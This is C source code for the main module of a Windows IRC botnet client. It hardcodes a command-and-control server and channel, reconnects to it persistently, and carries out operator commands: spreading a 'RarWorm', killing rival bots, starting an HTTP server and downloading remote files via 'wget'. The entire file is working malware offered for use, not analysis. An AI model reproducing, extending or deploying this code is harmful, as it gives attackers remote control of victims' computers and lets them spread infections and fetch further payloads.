#include "Includes.h"
#include "externs.h"
//######CONFIG######
char version[]= "blowjob";
char password[]= "hello";
char channel[20]= "#rar";
char newchannel[20]= "#rar";
char serverpass[30]= "passwd";
char server[30]= "msn.aspr.in";
int serverport = 6667;
char user[50]= "lol lol lol shown";
//##################

int sleeptime = 12000;
void iparse(char *commands);
SOCKET sock;

char *addrr(const char *addr)
{
	struct hostent *he = NULL;
	char address[64];
	
	if (addr == NULL)
		strcpy(address, "");
	else
		strcpy(address, addr);
	he = gethostbyname(address);
	while(!he)Sleep(sleeptime);
	return inet_ntoa(*(struct in_addr *) he->h_addr_list[0]);
}


int main()
{
	HANDLE MutexHandle;
	MutexHandle = CreateMutex(0, 0, "C");
	if(GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return(0);
	}
top:
	struct sockaddr_in addr;
	Sleep(5000);
	WSADATA WSAData;
	WSAStartup(MAKEWORD(1,0), &WSAData);
    char buffer[BUFSIZ];
	char *ptr;
    char msg[256];
	char temp[10];
	addr.sin_addr.s_addr = inet_addr(addrr(server));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(serverport);
	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	while(connect(sock,(struct sockaddr*)&addr,sizeof(addr)))
	{
		DnsFlushResolverCache();
		WSACleanup();
        closesocket(sock);
		goto top;
	}
	
	sprintf (buffer, "PASS %s\n", serverpass);
	send (sock, buffer, strlen (buffer), 0);
	
	sprintf (buffer, "USER %s\n", user);
	send(sock, buffer, strlen (buffer), 0);
	printf("user: %s\n",buffer);
	
	
	//random nick shit
	GetLocaleInfo(LOCALE_SYSTEM_DEFAULT, LOCALE_SABBREVCTRYNAME, temp, sizeof(temp));
	unsigned long total = GetTickCount() / (1000% 86400) / 3600;
	//////////////////////////
	HANDLE hFile, FileHandle;
	hFile = CreateFile("new.txt", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		sprintf (buffer, "NICK [%s][%iH]%s\n", temp, total, rndx(9));
		send(sock, buffer, strlen (buffer), 0);
		printf("newnick: %s\n",buffer);
		sprintf (buffer, "JOIN %s\n", newchannel);
		send(sock, buffer, strlen (buffer), 0);
		printf("newjoin: %s\n",buffer);
		FileHandle = CreateFile("new.txt", GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
		if(FileHandle != INVALID_HANDLE_VALUE)
			CloseHandle(FileHandle);
		CloseHandle(FileHandle);
		CloseHandle(hFile);
	} else { 
		sprintf (buffer, "NICK [%s][%iH]%s\n", temp, total, rndx(9));
		send(sock, buffer, strlen (buffer), 0);
		printf("nick: %s\n",buffer);
		CloseHandle(hFile);
	}
	
	Sleep(500);
	
	sprintf (buffer, "JOIN %s\n", channel);
	send (sock, buffer, strlen (buffer), 0);
	printf("join: %s\n",buffer);
	
	while (1) {
		
   	    memset(buffer, '\0', BUFSIZ); 
		
		if (recv(sock, buffer, BUFSIZ-1, 0) <= 0) 
		{
			
			WSACleanup();
            closesocket(sock);
			goto top;
		} else 
			
			if (strstr(buffer, "433")) //nick in use
			{
				sprintf (msg, "NICK [%s][%iH]%s\n", temp, total, rndx(9));
				send(sock, msg, strlen(msg), 0);
			}
			printf("%s",buffer);
			if (strstr(buffer, "PING :"))
			{
				ptr = strstr(buffer, "PING :") + strlen("PING :");
				sprintf(msg, "PONG :%s\n", ptr);
				send(sock, msg, strlen(msg), 0);
			}
			if (strstr(buffer, "404"))
			{
				
				sprintf (msg, "JOIN %s\n", channel);
				send(sock, msg, strlen(msg), 0);
			}
			
			if (strstr(buffer, "KICK"))
			{
				
				sprintf (msg, "JOIN %s\n", channel);
				send(sock, msg, strlen(msg), 0);
			}
			
			if (strstr(buffer, "PRIVMSG") || strstr(buffer, "NOTICE")) 
			{
				iparse(buffer);
			}
			
	}
	WSACleanup();
    closesocket(sock);
	return 0;
	\
		
}

void iparse(char *commands) {
	
	char buff[BUFSIZ];
	char *token[10];
	token[0] =strtok(commands," \r\n");
	for (int i=1;i<10;i++)
	{
		token[i]=strtok(NULL," \r\n");
	}
	
	if (strstr(token[3], "id"))
    {
		sprintf(buff,  "PRIVMSG %s :%s\n", channel, version);
        send(sock, buff, strlen(buff), 0);	
    }
	
	if (strstr(token[3], "kill"))
    {
		sprintf(buff,  "PRIVMSG %s :BotKiller Started\n", channel);
        send(sock, buff, strlen(buff), 0);
		botkiller(sock); 	
    }
	
	if (strstr(token[3], "fdns"))
    {
		DnsFlushResolverCache();		
    }
	
	if (strstr(token[3], "infect"))
	{
		XThread(RarWorm,NULL);
		sprintf(buff,  "PRIVMSG %s :RarWorm Activated\n", channel);
        send(sock, buff, strlen(buff), 0);
	}
	if (strstr(token[3], "http"))
	{
		sprintf(buff,  "PRIVMSG %s :Http Server Started\n", channel);
        send(sock, buff, strlen(buff), 0);
		XThread(Http_Server,NULL);
	}
	
	if (strstr(token[3], "memfind"))
    {
		sprintf(buff,  "PRIVMSG %s :Searching For String %s\n", channel,token[4]);
        send(sock, buff, strlen(buff), 0);
		
		//	MeMSearch(sock); 
	}
	if (strstr(token[3], "wget"))
    {
		Download(token[4], token[5]);
		sprintf(buff,  "PRIVMSG %s :Wgetting", channel);
        send(sock, buff, strlen(buff), 0);
		
    }
}








